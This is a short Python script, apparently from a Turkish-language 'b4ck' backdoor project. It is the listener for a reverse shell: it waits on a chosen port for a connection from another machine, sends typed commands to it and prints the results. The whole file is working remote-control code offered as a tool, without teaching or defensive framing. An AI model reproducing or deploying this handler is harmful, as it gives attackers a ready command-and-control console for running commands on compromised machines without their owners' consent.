#!/usr/bin/python3
import platform
import socket
import sys
import os
#b4ck OPEN-SOURCE PROJECT
class colors:
   platform = platform.system()
   if (platform == "Linux"):
       HEADER = '\033[95m'
       OKBLUE = '\033[94m'
       OKGREEN = '\033[92m'
       WARNING = '\033[93m'
       FAIL = '\033[91m'
       ENDC = '\033[0m'
       BOLD = '\033[1m'
       UNDERLINE = '\033[4m'
   else:
       HEADER = ''
       OKBLUE = ''
       OKGREEN = ''
       WARNING = ''
       FAIL = ''
       ENDC = ''
       BOLD = ''
       UNDERLINE = ''
def Main():
    host = str(sys.argv[1])
    port = int(sys.argv[2])

    mySocket = socket.socket()
    mySocket.bind((host, port))
    print(colors.WARNING+"    Server Başlatıldı bağlantı için bekleniyor"+colors.ENDC)
    mySocket.listen(1)
    conn, addr = mySocket.accept()
    print("Lütfen top veya nano gibi ctrl c veya ekranı kapamadıkca kapanmayan komutları yazmayın aksi taktirde bozulur!")
    print("\n\n		Bağlantı: " + str(addr))
    while True:
        data = conn.recv(2028)
        if not data:
            break
        cevap = (str(data, 'utf-8'))[2:-4].split(r"\n")
        for i in cevap:
            print (i)
        data = input(colors.WARNING+"b4ck->"+colors.OKGREEN)
        if data == "clear":
            print("Bu komut (şimdilik) düzgün çalışmamakda")
            conn.send(data.encode())        
        else:
            print(colors.ENDC)
            print("    KOMUT YOLLANIYOR: \n" + str(data))
            conn.send(data.encode())

    print("    BAĞLANTI KOPTU KAPATILIYOR!")
    conn.close()

try:
 Main()
except:
 print(colors.ENDC)
 sor = input("Kapatma'yı siz mi istediniz?[Y:n]")
 if sor == "Y":
  print(colors.ENDC)
  exit()
 else:
  input("\n\n    "+sys.argv[2] +" portu kullanılıyor portu devralayım mı? Lütfen şu komutları uyguluyarak kapatınız\nsudo lsof -i:"+sys.argv[2]+"\nkill <PID> Problemi hallettikden sonra ENTER'e basınız!")
  print(colors.ENDC)
  Main()

